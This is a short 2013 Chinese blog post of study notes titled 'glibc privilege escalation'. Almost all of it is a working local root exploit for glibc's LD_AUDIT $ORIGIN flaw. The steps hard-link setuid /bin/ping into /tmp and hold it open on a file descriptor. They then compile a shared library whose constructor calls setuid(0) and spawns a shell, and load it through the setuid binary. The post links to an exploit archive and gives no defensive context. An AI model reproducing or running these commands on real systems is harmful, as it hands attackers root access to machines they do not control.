title: "glibc提权"
date: 2013-06-05 21:02:38
tags:
id: 156
categories:
  - 学习笔记
---

<pre class="brush:cpp">mkdir test 
ln /bin/ping /tmp/test/target 
exec 3&lt; /tmp/test/target 
rm -rf /tmp/test/target
cat &lt; payload.c
void __attribute__((constructor)) init() 
{
setuid(0); 
system("/bin/sh"); 
}
gcc -w -fPIC -shared -o exploit payload.c 
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3

new <span style="color: #666666; font-family: Consolas;">[http://1337day.com/exploit/20788](http://1337day.com/exploit/20788)</span></pre>